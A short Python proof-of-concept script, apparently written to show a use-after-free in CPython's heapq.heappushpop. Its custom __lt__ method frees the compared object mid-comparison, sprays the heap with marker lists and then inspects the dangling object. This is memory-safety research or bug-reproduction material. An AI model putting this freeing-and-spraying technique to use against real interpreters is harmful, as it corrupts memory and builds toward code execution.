import heapq
import sys

class Target:
    def __init__(self):
        # Add some distinct values
        self.a = 0x11223344
        
    def __lt__(self, other):
        print('In Target.__lt__')
        # Drop the last reference to self
        heap[0] = None
        
        # Spray with lists containing a known marker
        global spray
        spray = []
        for i in range(100):
            spray.append([0x13371337]*5)
            
        print('Spray done')
        
        # Now self might be corrupted!
        try:
            print(f'self type: {type(self)}')
            print(f'self dict: {self.__dict__}')
        except Exception as e:
            print(f'Error: {e}')
            
        return False

heap = [Target()]

print('Calling heappushpop...')
heapq.heappushpop(heap, b"some item")
print('Done')
